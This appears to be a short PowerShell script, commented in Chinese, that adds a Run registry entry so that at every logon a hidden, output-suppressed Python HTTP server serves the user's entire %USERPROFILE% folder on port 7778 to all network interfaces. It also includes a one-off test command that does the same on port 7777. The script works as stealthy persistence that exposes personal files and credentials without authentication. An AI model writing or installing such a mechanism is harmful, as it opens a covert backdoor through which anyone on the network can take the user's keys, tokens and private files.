# 將開啟 7778 端口展示 %userprofile% 的動作加到 regedit 
# 如果python從來沒存取過網路，需要先讓他存取一次
python.exe -c "import os; from http.server import HTTPServer, SimpleHTTPRequestHandler; os.chdir(os.environ['USERPROFILE']); print('activating testing ctrl + c to out...'); server=HTTPServer(('0.0.0.0',7777), SimpleHTTPRequestHandler); server.serve_forever()"

# 將動作加入到 regedit 當中
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$name = "MyPythonServer"
$value = 'powershell.exe -WindowStyle Hidden -Command "Start-Process pythonw.exe -ArgumentList ''-c \"import sys,os;from http.server import HTTPServer,SimpleHTTPRequestHandler;os.chdir(os.environ[''''USERPROFILE'''']); sys.stdout=open(os.devnull,''''w'''');sys.stderr=open(os.devnull,''''w'''');server=HTTPServer((''''0.0.0.0'''',7778),SimpleHTTPRequestHandler);server.serve_forever()\"'' -WindowStyle Hidden"'

Set-ItemProperty -Path $registryPath -Name $name -Value $value
